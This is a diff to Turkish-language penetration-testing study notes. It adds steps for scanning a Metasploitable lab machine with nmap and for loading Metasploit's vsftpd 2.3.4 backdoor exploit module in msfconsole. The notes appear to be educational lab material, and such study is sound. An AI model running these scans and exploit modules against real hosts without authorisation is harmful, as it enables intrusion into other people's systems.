@@ -66,7 +66,16 @@ nmap → temel
 -sC → script
 -A → hepsi
 
-**_SunucuBilgisyar Hackleme_**
+**_Sunucu-Bilgisyar Hackleme_**
 
-~nmap -v -sS -A -T4 taget //sonuçlar kaydedilip açık portlarla sızma denemeleri yapılır
--Açık portlar sızma için başlangıç noktasıdır, ama başarı: Servis zafiyetine bağlıdır
+~nmap -v -sS -A -T4 taget //sonuçlar kaydedilip açık portlarla sızma denemeleri yapılır.Metasploitable a
+
+- Açık portlar sızma için başlangıç noktasıdır, ama başarı: Servis zafiyetine bağlıdır
+
+- İlk test 21 portu ftp açık portunda version kısmını cp yap "vsftpd 2.3.4" yanına exploit yazıp arat. rapid7 da hacklemek için oluşturulmu modüller var.
+
+- Metasploit Console -
+
+~msfconsole
+msf6> ~use exploit/unix/ftp/vsftpd_234_backdoor
+msf6 exploit(unix/ftp/vsftpd_234_backdoor)> ~show targets
